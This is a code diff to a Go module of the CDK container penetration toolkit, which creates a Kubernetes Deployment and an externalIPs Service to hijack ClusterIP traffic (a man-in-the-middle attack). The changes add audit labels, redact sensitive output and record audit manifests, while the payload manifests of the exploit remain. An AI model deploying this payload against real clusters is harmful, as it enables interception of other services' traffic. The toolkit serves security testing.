@@ -32,6 +32,7 @@ import (
 	"github.com/cdk-team/CDK/pkg/cli"
 	"github.com/cdk-team/CDK/pkg/plugin"
 	"github.com/cdk-team/CDK/pkg/tool/kubectl"
+	"github.com/cdk-team/CDK/pkg/util"
 )
 
 var K8sDeploymentsAPI = "/apis/apps/v1/namespaces/default/deployments"
@@ -39,7 +40,11 @@ var K8sMitmPayloadDeploy = `{
     "apiVersion": "apps/v1",
     "kind": "Deployment",
     "metadata": {
-        "name": "validator-payload-deploy"
+        "name": "validator-payload-deploy",
+        "labels": {
+            "audit.cdk/owner": "cdk",
+            "audit.cdk/component": "clusterip-validator"
+        }
     },
     "spec": {
         "replicas": 1,
@@ -51,7 +56,9 @@ var K8sMitmPayloadDeploy = `{
         "template": {
             "metadata": {
                 "labels": {
-                    "app": "validator-payload-deploy"
+                    "app": "validator-payload-deploy",
+                    "audit.cdk/owner": "cdk",
+                    "audit.cdk/component": "clusterip-validator"
                 }
             },
             "spec": {
@@ -77,7 +84,11 @@ var K8sMitmPayloadSvc = `{
     "apiVersion": "v1",
     "kind": "Service",
     "metadata": {
-        "name": "validator-externalip"
+        "name": "validator-externalip",
+        "labels": {
+            "audit.cdk/owner": "cdk",
+            "audit.cdk/component": "clusterip-validator"
+        }
     },
     "spec": {
         "externalIPs": [
@@ -166,7 +177,8 @@ func (p K8sMitmClusteripS) Run() bool {
 		fmt.Println(err)
 	}
 	log.Println("api-server response:")
-	fmt.Println(resp)
+	fmt.Println(util.RedactSensitive(resp))
+	writeAuditManifest("deployment", "validator-payload-deploy", optsDeploy.PostData)
 
 	// step2. create Mitm Services of ExternalIPs
 	optsSvc := kubectl.K8sRequestOption{
@@ -184,7 +196,8 @@ func (p K8sMitmClusteripS) Run() bool {
 		fmt.Println(err)
 	}
 	log.Println("api-server response:")
-	fmt.Println(respSvc)
+	fmt.Println(util.RedactSensitive(respSvc))
+	writeAuditManifest("service", "validator-externalip", optsSvc.PostData)
 
 	return true
 }
